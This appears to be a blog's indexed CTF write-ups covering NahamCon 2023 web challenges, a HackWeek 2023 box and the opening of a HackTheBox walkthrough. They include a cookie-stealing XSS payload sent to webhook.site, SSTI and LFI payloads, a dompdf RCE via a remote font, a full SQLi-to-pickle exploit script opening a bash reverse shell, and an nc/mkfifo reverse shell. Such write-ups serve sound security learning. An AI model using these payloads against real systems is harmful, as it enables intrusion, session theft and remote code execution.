[{"categories":["CTF"],"content":"Writeup for all the web challenges in NahamCon 2023 CTF.","date":"2023-06-22","objectID":"/nahamcon2023-web/","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"This post is focused on the walkthrough of NahamCon 2023 CTF. Introduction I participated in the NahamCon 2023 CTF with the team m4lware. We ended up 82 out of 2517 teams. From the web challenges I was only able to solve 2 challenges (Star Wars \u0026 Stickers) during the time of the competition but I managed to solve all of them afterwards with some hints and help. ","date":"2023-06-22","objectID":"/nahamcon2023-web/:0:0","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Star Wars Description Star Wars\rSolution The challenge was very easy. We got a simple website. We can create an account and login as the user. There we see a blog post by admin user. On the blog post there was a comment section. comment\rThe comment feature has no validation or sanitization so trying out for XSS we can inject a simple XSS payload and it works. Payload: \u003cscript\u003ealert(2)\u003c/script\u003e XSS triggered\rWe also got a message that comment would be reviewed by admin. comment msg\rcomment msg\rThis means that we can inject a malicious script and when the admin would review it the XSS would be triggered and we can get his cookie. Get a link from webhook.site. Then create an XSS payload as follows. \u003cscript\u003e const cookie = document.cookie; const xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"https://webhook.site/a3c68f0c-\u003cSNIP\u003e/?cookie=\" + encodeURIComponent(cookie), true); xhr.send(); \u003c/script\u003e Inject the payload in the comment and you’ll get the admin cookie in a while. Admin cookie in webhooks\rReplace your cookie with admin’s cookie and you’ll be logged in as admin. Go to /admin and you’ll get the flag. Star wars flag\rFlag: flag{a538c88890d45a382e44dfd00296a99b} ","date":"2023-06-22","objectID":"/nahamcon2023-web/:1:0","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Hidden Figures Description Hidden Figures\rSolution Being a static website, it doesn’t have anything interesting. Looking at the Page Source there are multiple images with base64 encoded src. Base64 encoded src\rUsing extract files in cyberchef, we get the following image. Cyberchef extract file\rThis indicates the flag may be in one of these images on the website. Extracting files from these images one by one we get the flag in one of the images. Hidden Figures Flag\rFlag: flag{e62630124508ddb3952843f183843343} ","date":"2023-06-22","objectID":"/nahamcon2023-web/:2:0","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Museum Description Museum\rSolution The website provides a functionality to view different images like in a Museum. Landing Page\rUpon viewing any image it takes us to http://challenge.nahamcon.com:31033/browse?artifact=angwy.jpg Image view\rThe artifact parameter looks promising for a LFI vulnerability. Upon several tries, I was able to read files from the system with following payload. http://challenge.nahamcon.com:31033/browse?artifact=/./etc/passwd /etc/passwd with LFI\rWe can’t directly read the /flag.txt as the application blocks us from that. To read the source code we’ll need the path to current application. We can get this by reading the /proc/self/cmdline. /proc/self/cmdline\rproc/self/cmdline can be used to get an idea of how the program was invoked (and potentially see source code location).\rSource: https://twitter.com/_JohnHammond/status/1318545091489824769 /proc/self/cmdline\rNow reading the source code from http://challenge.nahamcon.com:31033/browse?artifact=/./home/museum/app.py from flask import Flask, request, render_template, send_from_directory, send_file, redirect, url_for import os import urllib import urllib.request app = Flask(__name__) @app.route('/') def index(): artifacts = os.listdir(os.path.join(os.getcwd(), 'public')) return render_template('index.html', artifacts=artifacts) @app.route(\"/public/\u003cfile_name\u003e\") def public_sendfile(file_name): file_path = os.path.join(os.getcwd(), \"public\", file_name) if not os.path.isfile(file_path): return \"Error retrieving file\", 404 return send_file(file_path) @app.route('/browse', methods=['GET']) def browse(): file_name = request.args.get('artifact') if not file_name: return \"Please specify the artifact to view.\", 400 artifact_error = \"\u003ch1\u003eArtifact not found.\u003c/h1\u003e\" if \"..\" in file_name: return artifact_error, 404 if file_name[0] == '/' and file_name[1].isalpha(): return artifact_error, 404 file_path = os.path.join(os.getcwd(), \"public\", file_name) if not os.path.isfile(file_path): return artifact_error, 404 if 'flag.txt' in file_path: return \"Sorry, sensitive artifacts are not made visible to the public!\", 404 with open(file_path, 'rb') as f: data = f.read() image_types = ['jpg', 'png', 'gif', 'jpeg'] if any(file_name.lower().endswith(\".\" + image_type) for image_type in image_types): is_image = True else: is_image = False return render_template('view.html', data=data, filename=file_name, is_image=is_image) @app.route('/submit') def submit(): return render_template('submit.html') @app.route('/private_submission_fetch', methods=['GET']) def private_submission_fetch(): url = request.args.get('url') if not url: return \"URL is required.\", 400 response = submission_fetch(url) return response def submission_fetch(url, filename=None): return urllib.request.urlretrieve(url, filename=filename) @app.route('/private_submission') def private_submission(): if request.remote_addr != '127.0.0.1': return redirect(url_for('submit')) url = request.args.get('url') file_name = request.args.get('filename') if not url or not file_name: return \"Please specify a URL and a file name.\", 400 try: submission_fetch(url, os.path.join(os.getcwd(), 'public', file_name)) except Exception as e: return str(e), 500 return \"Submission received.\", 200 if __name__ == '__main__': app.run(debug=False, host=\"0.0.0.0\", port=5000) The interesting part is the following routes /private_submission_fetch and /private_submission. @app.route('/private_submission_fetch', methods=['GET']) def private_submission_fetch(): url = request.args.get('url') if not url: return \"URL is required.\", 400 response = submission_fetch(url) return response def submission_fetch(url, filename=None): return urllib.request.urlretrieve(url, filename=filename) @app.route('/private_submission') def private_submission(): if request.remote_addr != '127.0.0.1': return redirect(url_for('submit')) url = request.args.get('url') file_name = request.args.get('filename') if not url or not file_name: return \"Please specify a URL and a file name.\", 400 t","date":"2023-06-22","objectID":"/nahamcon2023-web/:3:0","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Obligatory Description Obligatory\rSolution Landing Page\rThis application provides a basic sign in and sign up feature. We can make an account to login. Upon logging in, we can see a basic todo app. Creating a new task, it creates a new task and displays the text Task Created. Todo App\rNotice that upon changing the success parameter, whatever we put into it, it reflects back on the page. test\rThere can be a number of vulnerabilities we can test, one of them is SSTI. Adding a simple SSTI payload for Jinja2: {{7*7}} SSTI works\rAs simple as that we can try a payload from PayloadAllTheThings to get the command execution. Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} But to our surprise, it blocks certain commands using a blacklist. WAF\rTrying some WAF bypass payloads, we get one working as follows. WAF Bypass Payload\rWe can use the self.__dict__ to get the dictionary that holds the attributes and their corresponding values for an instance of the current class. To bypass the WAF, we’ll use the following payload. Payload: {{self|attr('\\x5f\\x5fdict\\x5f\\x5f')}} self.__dict__\rHere we get the secret key being used in the flask login session. Secret Key: \u0026GTHN\u0026Ngup3WqNm6q$5nPGSAoa7SaDuY We can use flask-unsign to decode the current auth-token cookie. Auth-Token\rIt shows that our id is 2, indicating that there’s another user with id=1. We can sign a new cookie with id=1 as we have the secret key. Signing a new cookie\rUpdating the session cookie, we get the flag. Obligatory Flag\rFlag: flag{7b5b91c60796488148ddf3b227735979} ","date":"2023-06-22","objectID":"/nahamcon2023-web/:4:0","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Marmalade 5 Description Marmalade 5\rSolution Landing Page\rThe landing page asks us for a username and then takes us to the following page. Logged in as saad\rThere’s nothing much in the application except that we need to somehow become admin to get the flag. We can try entering admin as our username on the initial page but it doesn’t allow us. Decoding our session token, we see that it uses MD5_HMAC algorithm and has our username in the payload. JWT Token Decoded\rUpon changing anything in the original token, we get the following error. Invalid Token\rThis leaks the signing key partially. Also, notice that if we provide the MD5_HMAC as the token header it shows invalid signature. Invalid Signature\rBut if we change the algorithm to HS256 for instance, then it shows invalid algorithm. Invalid Algorithm\rSo in short, we need to keep the algorithm to MD5_HMAC and brute force the remaining characters of the signing key. The signing key is 15 characters long out of which 10 are given (all lowercase). So we can guess the remaining 5 characters may also be lowercase letters. This post provides details for manual implementation of JWT with SHA-256. We can change the SHA-256 part to MD5 to make our custom JWT algorithm. import json import base64 import hmac import hashlib def create_jwt_token(secret_key): jwt_header = \"\"\" { \"alg\": \"MD5_HMAC\" } \"\"\" jwt_data = \"\"\" { \"username\": \"saad\" } \"\"\" jwt_values = { \"header\": jwt_header, \"data\": jwt_data, } # remove all the empty spaces jwt_values_cleaned = { key: json.dumps( json.loads(value), separators = (\",\", \":\"), ) for key, value in jwt_values.items() } jwt_values_enc = { key: base64.urlsafe_b64encode( value.encode(\"utf-8\") ).decode(\"utf-8\").rstrip('=') for key, value in jwt_values_cleaned.items() } sig_payload = \"{header}.{data}\".format( header = jwt_values_enc['header'], data = jwt_values_enc['data'], ) sig = hmac.new( secret_key, msg = sig_payload.encode(\"utf-8\"), digestmod = hashlib.md5 ).digest() ecoded_sig = base64.urlsafe_b64encode(sig).decode(\"utf-8\").rstrip(\"=\") jwt_token = \"{sig_payload}.{sig}\".format( sig_payload = sig_payload, sig = ecoded_sig ) return jwt_token print(create_jwt_token(b\"test_secret_key\")) custom jwt token\rNow we need to brute-force the remaining part of original key to get the full signing key. def brute_force_secret_key(known_secret_key): # Assuming only lowercase letters as the first 10 characters are lowercase lowercase_letters = 'abcdefghijklmnopqrstuvwxyz' total_combinations = len(lowercase_letters) ** 5 progress_bar = tqdm(total=total_combinations, unit='combination') for combination in itertools.product(lowercase_letters, repeat=5): # Create the potential secret key by combining the known key and the brute-forced lowercase letters secret_key = known_secret_key + ''.join(combination) check_token = create_jwt_token(\"saad\", secret_key.encode()) original_jwt_token = \"eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InNhYWQifQ.N87s9fHVZzgaytkjwri3MQ\" if (check_token == original_jwt_token): print(f'Found original key: {secret_key}') return secret_key progress_bar.update(1) else: progress_bar.close() print(\"Secret Key not found!\") return None partial_secret_key = \"fsrwjcfszeg\" original_secret_key = brute_force_secret_key(partial_secret_key) I logged in as saad and saved my token as original_jwt_token. Next I brute forced the remaining 5 characters of the key and created a new token with create_jwt_token. Finally, I matched it against the original_jwt_token and if the match is found, then I’ll get my original secret_key. Finally using this secret key, we can create the admin jwt token to get the flag. Final script. import json import base64 import hmac import hashlib import itertools from tqdm import tqdm def create_jwt_token(username, secret_key): jwt_header = \"\"\" { \"alg\": \"MD5_HMAC\" } \"\"\" jwt_data = \"\"\" {{ \"username\": \"{}\" }} \"\"\".format(username) jwt_values = { \"header\": jwt_header, \"data\": jwt_data, } # remove all the empty spaces jwt_values_cleaned = { key: json.dumps( json","date":"2023-06-22","objectID":"/nahamcon2023-web/:5:0","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Stickers Description Stickers\rSolution We get a stickers application in which we can enter organisation name, email and number of stickers to generate a pdf mentioning the total price of the stickers. Landing Page\rUpon submitting we get a nice looking PDF with our input values reflected. Sticker pdf\rAnalyzing the pdf with pdfinfo we see it’s using dompdf 1.2. pdfinfo\rUpon looking for exploits for dompdf, there was a RCE vulnerability applicable on the same version. This post explains the vulnerability really well so I’ll only discuss about it briefly. dompdf RCE\rDompdf versions \u003c1.2. 1 are vulnerable to Remote Code Execution (RCE) by injecting CSS into the data. The file can be tricked into storing a malicious font with a . php file extension in its font cache, which can later be executed by accessing it from the web.\rSource: https://github.com/rvizx/CVE-2022-28368 To make the exploit work, we first need to take a valid .ttf file and change the extension to .php. This approach is the actual way to exploit it but for some reason if I was using any .ttf file and append the php in it then it was showing parsing errors. So I tried looking for POCs and this one’s php file worked without any errors. Git clone the above repo and cd into the exploit folder. git repo\rStart a ngrok server and put its IP into the exploit.css file. @font-face { font-family:'exploitfont'; src:url('\u003cYOUR_ngrok_IP\u003e/exploit_font.php'); font-weight:'normal'; font-style:'normal'; } Contents of exploit_font.php are as follows. exploit_font.php\rI’ll append another line to print the flag from / directory. appending flag read\rupdated exploit_font.php\rNow while generating the PDF in the web application, put the value of organisation parameter as follows. \u003clink rel=stylesheet href=\"\u003cYOUR_ngrok_IP\u003e/exploit.css\"\u003e Next, submit the request. Generated pdf\rNow extract the md5 sum of the exploit_font.php file as follows. md5 of exploit_font.php\rFinally visit the following URL to get the flag. http://challenge.nahamcon.com:30473/dompdf/lib/fonts/exploitfont_normal_b54a59dd45adebff7cce9df9a7f53c75.php Stickers flag\rFlag: flag{a4d52beabcfdeb6ba79fc08709bb5508} ","date":"2023-06-22","objectID":"/nahamcon2023-web/:6:0","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Transfer Description Transfer\rThis was one of the coolest web challenges that I’ve solved. It was hard for me so I had to look at hints and writeups to better understand the code. Solution Landing Page\rThis challenge also provides the source code so we’ll analyze that first. The app.py has several routes so we’ll go through the important ones. Take a look at the GET /download/\u003cfilename\u003e/\u003csessionid\u003e route. @app.route('/download/\u003cfilename\u003e/\u003csessionid\u003e', methods=['GET']) def download_file(filename, sessionid): conn = get_db() c = conn.cursor() c.execute(f\"SELECT * FROM activesessions WHERE sessionid=?\", (sessionid,)) active_session = c.fetchone() if active_session is None: flash('No active session found') return redirect(url_for('home')) c.execute(f\"SELECT data FROM files WHERE filename=?\",(filename,)) file_data = c.fetchone() if file_data is None: flash('File not found') return redirect(url_for('files')) file_blob = pickle.loads(base64.b64decode(file_data[0])) return send_file(io.BytesIO(file_blob), download_name=filename, as_attachment=True) In this route, it first checks if there’s an active session exists. active sessions query c.execute(f\"SELECT * FROM activesessions WHERE sessionid=?\", (sessionid,)) If this query returns a valid result, it then checks for a specific file. file loading query c.execute(f\"SELECT data FROM files WHERE filename=?\",(filename,)) If the file data exists as well then we get to the file_blob part. Here it calls pickle.loads() on the file_data fetched earlier. pickle.loads()\rThe risks associated with pickle.loads() are due to the fact that it can execute arbitrary Python code during the deserialization process. If an attacker can control the pickle data, they can potentially craft a payload that executes malicious code when the data is deserialized using pickle.loads().\rWe saw that it calls pickle.loads() on the contents of the file fetched from the db. If we can somehow inject RCE Payload on the file and call this API, then it will execute our payload and we can get the shell on the system. How can we inject the payload into the file? Let’s look at the /login endpoint. POST /login @app.route('/login', methods=['POST']) def login_user(): username = DBClean(request.form['username']) password = DBClean(request.form['password']) conn = get_db() c = conn.cursor() sql = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\" c.executescript(sql) user = c.fetchone() if user: c.execute(f\"SELECT sessionid FROM activesessions WHERE username=?\", (username,)) active_session = c.fetchone() if active_session: session_id = active_session[0] else: c.execute(f\"SELECT username FROM users WHERE username=?\", (username,)) user_name = c.fetchone() if user_name: session_id = str(uuid.uuid4()) c.executescript(f\"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')\") else: flash(\"A session could be not be created\") return logout() session['username'] = username session['session_id'] = session_id conn.commit() return redirect(url_for('files')) else: flash('Username or password is incorrect') return redirect(url_for('home')) This route takes in a username and password, then passes it to the SQL query to check if the user exists. Notice that it first passes the params through DBClean function. DBClean function def DBClean(string): for bad_char in \" '\\\"\": string = string.replace(bad_char,\"\") return string.replace(\"\\\\\", \"'\") Here if we provide, \u003cspace\u003e, ', or \"\" then it removes it from the parameter. This removes the chance of SQL injection but the last line string.replace(\"\\\\\", \"'\") basically introduces the SQLi here. If the DBClean sees a \\ then it replaces it with ' single quotation mark, allowing us to exploit the SQLi. Next thing to note is the usage of executescript() and execute() functions. executescript()\rexecutescript() is used to execute multiple SQL statements or an entire script. It takes a string argument containing one or ","date":"2023-06-22","objectID":"/nahamcon2023-web/:7:0","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Inserting a valid active session As we previously saw that the username parameter is first passed in DBClean function and then passed to executescript(). We can make a SQLi payload such that it leverages the SQLi, bypasses the DBClean sanitization and inserts a new active session to the DB. I’ll run the exploit locally first by running the app.py file as python3 app.py This will also create a /tmp/database.db file. The db schema is as follows. sqlite3 db schema\rThe activesessions table has three fields i.e. session_id, username and timestamp. The timestamp format can be seen from the app.py. c.executescript(f\"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')\") Now the query to insert the active session into the DB. SQLi Query: admin';\\nINSERT INTO activesessions (sessionid, username, timestamp) VALUES ('123', 'saad', '2023-06-20/**/06:13:22.123456');-- I made a function for reversing the DBClean() function such that if I provide the normal query it would convert into a version suitable for DBClean() function. def DBRestore(string): string = string.replace(\"'\", \"\\\\\") string = string.replace(\"\\n\", \"%0a\") string = string.replace(\" \", \"/**/\") return string Credits for this idea goes to: https://www.youtube.com/watch?v=PbpDB0jlqbc\u0026ab_channel=Kr1ppl3r ","date":"2023-06-22","objectID":"/nahamcon2023-web/:7:1","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Generating a payload for RCE Make a class doPickle whose overall purpose is to create a payload that, when deserialized using pickle.loads(), will execute the specified payload as a command using os.system(). def doPickle(payload): class PickleRce(object): def __reduce__(self): return (os.system, (payload,)) return base64.b64encode(pickle.dumps(PickleRce())) Next is to create a reverse shell. encodedCommand = base64.b64encode(f'bash -i \u003e\u0026 /dev/tcp/{LHOST} 0\u003e\u00261'.encode('utf-8')).decode('utf-8') Command = f'echo \"{encodedCommand}\" | base64 -d | bash ' picklePayload = doPickle(Command).decode('utf-8') Reference: https://silver-4.gitbook.io/about/this-week/capture-the-flag/transfer ","date":"2023-06-22","objectID":"/nahamcon2023-web/:7:2","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Inserting the payload into the files table From the schema, the files table takes in unique filename, blob data and valid session id. SQLi Query: admin';\\nINSERT INTO files (filename, data, sessionid) VALUES ('MYFILE', 'PICKLEPAYLOAD', '123');-- Passing it through the DBRestore function I made, we can get the DBClean version of this. ","date":"2023-06-22","objectID":"/nahamcon2023-web/:7:3","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"Final Script import pickle, requests ,sys, random, base64, os # Specifying URL of the site and URL, IP_PORT = sys.argv[1], sys.argv[2].replace(\":\", \"/\") print(f\"(+) Target URL: {URL}\") print(f\"(+) Your IP and PORT: {IP_PORT}\") # Function to make the pickle RCE payload def doPickle(payload): class PickleRce(object): def __reduce__(self): return (os.system, (payload,)) return base64.b64encode(pickle.dumps(PickleRce())) # Function to trigger the RCE payload after inserting into the DB def triggerPayload(filename): print(\"(+) Trigger payload\") headers = { 'Host': URL, 'Content-Type': 'application/x-www-form-urlencoded', } endpoint = f\"{URL}/download/{filename}/123\" print(f\"(+) Endpoint: {endpoint}\") return requests.get(endpoint, headers=headers, verify=False, allow_redirects=False).text # Inverted Function for the DBClean sanitization def DBRestore(string): string = string.replace(\"'\", \"\\\\\") string = string.replace(\"\\n\", \"%0a\") string = string.replace(\" \", \"/**/\") return string # Function to send the HTTP requests to /login endpoint for inserting different queries def sendRequest(description, data): print(f\"(+) {description}\") headers = { 'Host': URL, 'Content-Type': 'application/x-www-form-urlencoded', } data = f'username={data}\u0026password=1' return requests.post(f\"{URL}/login\", headers=headers, data=data, verify=False, allow_redirects=False).text # Inserting an active session payload = DBRestore(\"admin';\\nINSERT INTO activesessions (sessionid, username, timestamp) VALUES ('123', 'saad', '2023-06-20/**/06:13:22.123456');--\") sendRequest(\"Create session\", payload) # Generating a random number for unique file name randNum = random.randint(10000, 99999) # Generating the reverse shell and pickle payload encodedCommand = base64.b64encode(f'bash -i \u003e\u0026 /dev/tcp/{IP_PORT} 0\u003e\u00261'.encode('utf-8')).decode('utf-8') Command = f'echo \"{encodedCommand}\" | base64 -d | bash ' picklePayload = doPickle(Command).decode('utf-8') # Inserting file with payload into the DB payload = DBRestore(\"admin';\\nINSERT INTO files (filename, data, sessionid) VALUES ('MYFILE', 'PICKLEPAYLOAD', '123');--\".replace(\"MYFILE\", str(randNum)).replace(\"PICKLEPAYLOAD\", picklePayload)) sendRequest(\"Create file\", payload) # Triggering the payload to get RCE triggerPayload(randNum) Start the ngrok and nc listener and execute the script. Executing the script\rWe’ll get a reverse shell as user transfer. sudo -l reveals (root) NOPASSWD: ALL. Run sudo su to get shell as root and read the flag at /root/flag.txt. Transfer Flag\rFlag: flag{8acde75d731975c7bccaf64f805f131f} Thanks for reading ","date":"2023-06-22","objectID":"/nahamcon2023-web/:7:4","tags":["ctf","writeup","nahamcon2023"],"title":"NahamCon 2023 CTF - Web Challenges","uri":"/nahamcon2023-web/"},{"categories":["CTF"],"content":"HackWeek 2023 CTF by FAST-KHI walkthrough.","date":"2023-01-29","objectID":"/hackweek23-ctf/","tags":["ctf","writeup"],"title":"HackWeek 2023 - CTF","uri":"/hackweek23-ctf/"},{"categories":["CTF"],"content":"This post is focused on the walkthrough of HackWeek 2023 CTF by FAST-KHI. ","date":"2023-01-29","objectID":"/hackweek23-ctf/:0:0","tags":["ctf","writeup"],"title":"HackWeek 2023 - CTF","uri":"/hackweek23-ctf/"},{"categories":["CTF"],"content":"Enumeration Starting off with the initial nmap scan. bash ┌──(kali💥kali)-[~/Desktop/tryhackme/hackweek23] └─$ nmap -A -vv 10.10.58.161 -oN nmapN PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 1f2241ada68cbcd78a633f50bd963571 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYSzzObiEyY3dbw3mzROyvdlbFShgmyG4hrdgmhhBfzysf92hsRAfoQCiGb31/hjD9HEHZArgiT46H5qUHa6zEEWsoRznouTtgeMw+Jz0TsBUQU5t0nm9xwQRAWcX4fDpU27hSn3JNHAmHF0v5njGn65we6cncfDTJK3rRJiJ35zliR2ogius+F3Cqc4I44mFJzdavT1LYJ9JT8fKac7XKlUVPlje7OzS2eS2YknDLNq18HtGAqQvgkZn12BcANOD+hqlJw+i172OcT5XZoxDKqPnm+9lQXzRrUdMJMArb3EZGPg+GyVyL26L3VW37nNQzPaTFcZ5JOf3gEXl+igf8x2GvKsO4oPj7lQ6OeLnn307fSnDbRJSZ84khSoKDcGqXrnYNObZqU+RZKNUg4mTirM8iuoPRNCCqc4NTS0GwpICaBb8W6uouS5gZPboAP8qkyBHl8fXZMt2ibetePDKMIYnoU3d0Ehz/zbCq2pB7Prn7ZASulnH9iqH4/6/Pz4k= | 256 b9bbc4e05bc0110faf308e1920363866 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG8pbjCFQncSLJDkddPU28VRxryr19fQ4hR+WJJJjDGwqAav8uFYvW2rpRec8PSZJsmbgLeTcKqt7evakUjOwMU= | 256 b31838a4ef7ccd8cfc252ad8680b75e3 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvOwse5rkVQbQT9FtSOcp4jImJ0kMvaOPrDiG2vpz4o 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: HackWeek '23 | http-robots.txt: 1 disallowed entry |_/MWzF2MqBWW Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Starting with port 80. Website\rChecking the source of the page, we see the following text. Page Source\rAlso, the nmap scan revealed a disallowed entry in robots.txt file. nmap scan\rrobots.txt\rVisiting the endpoint, we get username and password in encoded form. username and password\rDecoding it with Cyber Chef from base32 we get clear text credentials. username\rpassword\rWe got the answer to the first question which is Blackmagic. ","date":"2023-01-29","objectID":"/hackweek23-ctf/:1:0","tags":["ctf","writeup"],"title":"HackWeek 2023 - CTF","uri":"/hackweek23-ctf/"},{"categories":["CTF"],"content":"Foothold Logging in, we get the following page. random page\rAs the description says, we can run commands on this page. Running id command we see the output reflected. command injection\rSimply copy a reverse shell from revshells and start a listener. On my Kali machine, nc\rAnd then on the website enter the following. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc 10.18.2.202 4444 \u003e/tmp/f entering the shell\rAnd we get the connection back on our machine. shell\rOn the current folder there’s an interesting file sharkk.pcapng. directory listing\rSimply start a python server on the machine to transfer this file to our local machine to further analyze it. bash www-data@vagrant:/var/www/html$ python3 -m http.server 8081 \u0026 Now wget the file on our machine. ┌──(kali💥kali)-[~/Desktop/tryhackme/hackweek23] └─$ wget http://10.10.58.161:8081/sharkk.pcapng ","date":"2023-01-29","objectID":"/hackweek23-ctf/:2:0","tags":["ctf","writeup"],"title":"HackWeek 2023 - CTF","uri":"/hackweek23-ctf/"},{"categories":["CTF"],"content":"pcap Analysis Running the file command it shows it’s a packet capture file. file\rUpon analyzing the capture file in wireshark, we can go to File \u003e Export Objects \u003e HTTP and save the files. HTTP objects\rWe have two files one is the html code while the other is a binary name simple_math. simple_math\r","date":"2023-01-29","objectID":"/hackweek23-ctf/:3:0","tags":["ctf","writeup"],"title":"HackWeek 2023 - CTF","uri":"/hackweek23-ctf/"},{"categories":["CTF"],"content":"Reversing the binary Upon running the binary, we have to enter a 4-digit PIN in order to get the root password. running the binary\rThe link provided by the binary was a great help to the challenge but I won’t be discussing it here. :) Hint: https://youtu.be/DLzxrzFCyOs Checking the strings command. We see some interesting strings. strings\rThe base64 encoded string is the same link we saw above. ┌──(kali💥kali)-[~/Desktop/blog/chaos] └─$ echo eW91dHUuYmUvREx6eHJ6RkN5T3M= | base64 -d youtu.be/DLzxrzFCyOs We also see a string password is 1337. On entering the password 1337, we still didn’t get the correct password. entering 1337\rLet’s fire up ghidra to analyze it further then. While analyzing the main function, we have a variable whose value is 1337. local_98\rOn further analysis, another variable local_8c calls the pin() function and with whatever value we input. local_8c\rChecking the pin function, it adds 100 to our input value. pin function\rFurther below on the main function, in the else if part, there’s a comparison local_98 == local_8c + 0xba. To break it down. local_98 = 1337 local_8c = (our input) + 100 0xba = 186 So to solve the challenge, we need to enter 1051 which is 1337 - (100 + 186). Entering 1051 as PIN, we get the root password. Solving the binary\r","date":"2023-01-29","objectID":"/hackweek23-ctf/:4:0","tags":["ctf","writeup"],"title":"HackWeek 2023 - CTF","uri":"/hackweek23-ctf/"},{"categories":["CTF"],"content":"Root flag With this password, we can login as root through ssh on the machine and get the root flag. root flag\rThanks for reading! ","date":"2023-01-29","objectID":"/hackweek23-ctf/:5:0","tags":["ctf","writeup"],"title":"HackWeek 2023 - CTF","uri":"/hackweek23-ctf/"},{"categories":["HackTheBox"],"content":"HackTheBox medium machine Ambassador walkthrough.","date":"2023-01-28","objectID":"/hackthebox-ambassador/","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Medium difficulty Machine Ambassador from HackTheBox. ","date":"2023-01-28","objectID":"/hackthebox-ambassador/:0:0","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador] └─$ nmap -A -vv 10.10.11.183 -oN nmapN PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc= | 256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs= | 256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Ambassador Development Server 